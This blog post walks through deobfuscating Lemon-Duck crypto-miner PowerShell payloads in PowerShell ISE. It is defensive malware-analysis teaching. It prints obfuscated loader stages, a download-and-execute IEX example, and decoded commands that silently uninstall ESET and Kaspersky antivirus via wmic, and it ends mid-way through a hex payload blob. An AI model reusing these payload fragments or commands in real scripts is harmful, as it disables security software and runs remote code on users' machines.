full_description = '''Lemon-Duck Powershell: An easy way to deobfuscate it! Malware Feb 06, 2021 I came across a fileless malware called Lemon-Duck crypto miner during our (my officemate and I) investigation on suspicious communication in our client network. This malware completely leveraging the PowerShell module to execute most of their payloads. PowerShell attacks are currently the popular weapon of alternative for several of those attacks as a result of it provides a variety of techniques for bypassing existing security. Not least of all, the flexibility to run directly in memory and remotely download payloads gave a lot of benefits to the attacker. Here in this blog post, we will learn how to deobfuscate obfuscated scripts easily. All we need is a text editor and PowerShell ISE. Windows PowerShell Integrated Scripting Environment (ISE) is used to create, run, and debug commands and scripts. I’ll use VSCode for my text editor. You may conduct this analysis in a safe malware analysis environment, as we might accidentally execute malware code without our concern. The above figure shows the interface of Powershell ISE. You may run the ISE in administrator mode. As you can see, there are two parts to the ISE GUI. The white space will be our place to place our PowerShell code while the blue one is to interact and run our PowerShell code. Before we proceed with the deobfuscation process, we need to have little understanding of what makes the script run and execute. So, in PowerShell, there is a cmdlet that is used to evaluates or runs a specified string as a command. This cmdlet is called Invoke-Expression or in short form IEX. This IEX can be deobfuscated to hide their presence in analyst first glance. For example, the below command line use to download and execute the content of the Payload.ps1 using Invoke-Experession PowerShell cmdlet. Powershell -Invoke-Expression (("New-Object Net.WebClient")).('Payload.ps1’) Deobfuscation Below the snippet code is the content of one of the payloads executed by the malware. I`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$(''-split'(..)'|?{$_}|%{[convert]::ToUInt32($_,16)}))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd(); As you read the content, it has an IEX cmdlet at the beginning of the code. First step Using your text editor, Identify the IEX cmdlet and remove it from the code. Thus make your code looks like below: $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601 .... Second step Add variable and equal sign in front of the code. Give any variable name you wanted. In my case, I’ll be using $decoded as my variable. Our objective in doing this is to make the decoded value stores in our $decoded variable so that then we can view the decoded value. Our code will look like below: $decoded = $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601 .... Third step Copy the full code into the ISE editor. Forth step After copy the code, run the code by click the “Green Play” icon above the tab. This will make our code run and store the decoded value in variable $decoded. As you can see in blue PowerShell, the code is executed. Fifth step Print the value stored in the $decoded variable into a text file, so that we can view it in our text editor. You might want to change your directory first. cd C:\Users\<user name>\Desktop echo $decoded > decoded_1.txt Because the malware encodes the script multiple times, so I name my decoded text file with the number at the back to indicate my phase in deobfuscate the code. Sixth step Open the decoded file and repeat steps 1 until 5. The figure below shows the comparison between the original code and decoded version. The problem here, the author of the malware encodes the script multiple times using different techniques. Repeat Using this technique, we don’t need to manually decode the Char, reverse char, and many more obfuscation techniques in a manual way. From now, repeat steps 1 until 5. Let’s follow along. Identify the IEX and remove it first: If you don’t know what the line does, just run the line in PowerShell like below. Figure below shows that .( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn'') is actually Invoke-Expression cmdlet. If we look into this code, this code stores these long strings (the code) into the variable $LW7eF. $LW7eF= ")'X'+]31[DillEhs$+]1[dilLEHs$ (. |)29]rAHc[]GNirtS[,)15]rAHc[+65]rAHc[+401]rAHc[((EcalPer.)'$','0N9'(EcalPer.)93]rAHc[]GNirtS[,)401]rAHc[+201]rAHc[+311]rAHc[((EcalPer.)' <--- snippet ---> ehfq+hfqvitcaretnionhfq+hfq/ llatsninu llac OgpHEf%%hfq+hfqyksrepsaK%%HEf ekil emanOgp erehw'+' tcudorp exe.cimw b/ trats c/ dmc '+' evitcarethfq+hfqnion/ llatsninu llac OgpHEf%tesE%HEf ekil emanOgp erehw tcudorp exe.cimw b/ trhfq+hfqats c/ dmchfq(( )hfqXhfq+]03[EmOHsP0N9+]12[EMOhSP0N9 ( . '( "; .( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn'')(( Get-vARIabLE lw7ef ).valUe[-1..-( ( Get-vARIabLE lw7ef ).valUe.lenGTh )]-jOiN'') At the final line, the value will be decoded with the line (( Get-vARIabLE lw7ef ).valUe[-1..-( ( Get-vARIabLE lw7ef ).valUe.lenGTh )]-jOiN'') and being execute using IEX represent in obfuscated way .( $veRbosePrEfERENCe.TOStrIng()[1,3]+'X'-joIn''). So we’ve done removing the IEX. Next, copy the whole code but without (( Get-vARIabLE lw7ef ).valUe[-1..-( ( Get-vARIabLE lw7ef ).valUe.lenGTh )]-jOiN'') line and execute it. We will execute this line seperately. Then run the above line (( Get-vARIabLE lw7ef ).valUe[-1..-( ( Get-vARIabLE lw7ef ).valUe.lenGTh )]-jOiN'') but with the variable $decoded and equal sign at the front like in the below figure. Then, print the value into a text file. On the right side. Our code becomes more readable than before (left side). All we need to continue to deobfuscate the code again. Identify and remove IEX Append our variable in front of the code. $decoded = (' . ( 9N0PShOME[21]+9N0PsHOmE[30]+qfhXqfh) ((qfhcmd /c staqfh+qfhrt /b wmic.exe product where pgOname like fEH%Eset%fEHpgO call uninstall /noinqfh+qfhteractive '+' cmd /c start /b wmic.exe product '+'where pgOname like fEH%%Kasperskyqfh+qfh%%fEHpgO call uninstall /qfh+qfhnointeractivqfh+qfhe <--- snippet ---> schqfh+qfhtasks /delete /tn Rtsa /Fqfh).RePlacE(([Char]75+[Char]118+[Char]49),qfh9N0qfh).RePlacE(([Char]102+[Char]'+'69+[Char]72),[STrINg][Char]'+'39).RePlacE(qfhf'+'G9qfh,[STrINg][Char'+']124).RePlacE(('+'[Char]120+[Char]74+'+'[Char]121),qfhh83qfh).RePlacE(([Char]90+[Char]111+[Char]87),[STrINg][Char]96).RePlacE(([Char]112+[Char]103+[Char]79),[STrINg][Char'+']34)'+' ) ').rePlacE(([cHAr]113+[cHAr]102+[cHAr]104),[StriNG][cHAr]39).rePlacE('9N0','$').rePlacE(([cHAr]104+[cHAr]56+[cHAr]51),[StriNG][cHAr]92) Copy the whole code and execute it in PowerShell ISE. Print value of variable decoded into another text file. Based on the result, still we can see that the code is not fully deobfuscated. Repeat the steps until we get the clean version of the code. Below is the final deobfuscation of the code, and the script has now become clean and readable. Final result Original obfuscate code I`EX $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$('edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac8'''
